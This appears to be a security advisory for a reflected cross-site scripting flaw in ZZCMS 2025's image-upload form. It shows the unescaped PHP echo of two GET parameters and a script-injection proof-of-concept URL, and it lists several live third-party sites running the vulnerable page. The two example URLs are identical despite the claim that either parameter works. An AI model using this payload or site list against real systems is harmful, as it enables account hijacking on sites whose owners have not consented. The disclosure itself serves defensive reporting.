# **Cross-Site Scripting Vulnerability in ZZCMS uploadimg_form.php**





## Vendor Information



**Official Website:** http://www.zzcms.net/

**Source Code Download:** http://www.zzcms.net/download/zzcms2025.zip

**Affected Version:** ZZCMS 2025



## Vulnerability Analysis

**Note: Exploiting this vulnerability requires authentication. A user can simply register a personal account to trigger the issue.**

### Source Code Analysis

The vulnerability is located in the form submission operation of `/up/uploadimg_form.php`.

```php+HTML
<div style="display:block;" id="A_con1">
<form action="uploadimg.php" method="post" enctype="multipart/form-data" style="padding:10px" >

<input type="file" name="g_fu_image[]" /><input type="submit" name="Submit" value="提交" />
<input name="noshuiyin" type="hidden" id="noshuiyin" value="<?php echo @$_GET['noshuiyin']?>" />
<input name="imgid" type="hidden" id="imgid" value="<?php echo @$_GET['imgid']?>" />
</form>
</div>
```

In the code, the values of the GET parameters `noshuiyin` and `imgid` are directly output into the `value` attribute of hidden form fields without any escaping or filtering.

### Request Construction

Either of the two parameters can be used to exploit the vulnerability.

```
http://demo.com/up/uploadimg_form.php?imgid="><script>alert('XSS')</script>&noshuiyin=foo

#or

http://demo.com/up/uploadimg_form.php?imgid="><script>alert('XSS')</script>&noshuiyin=foo
```



### Vulnerability Verification

![image-20250225204446195](/assest/zzcms/xss-uploadimg_form/xss-1.png)



### Website Reference

**Note:** Authentication is required to trigger the vulnerability; users can simply register a personal account for testing purposes.

```
http://demo.zzcms.net/up/uploadimg_form.php
https://www.88zsw.com/up/uploadimg_form.php
http://818yyzs.com/up/uploadimg_form.php
http://bjp.zzcms.net/up/uploadimg_form.php
http://9.zzcms.net/up/uploadimg_form.php
http://hzp.zzcms.net/up/uploadimg_form.php
```















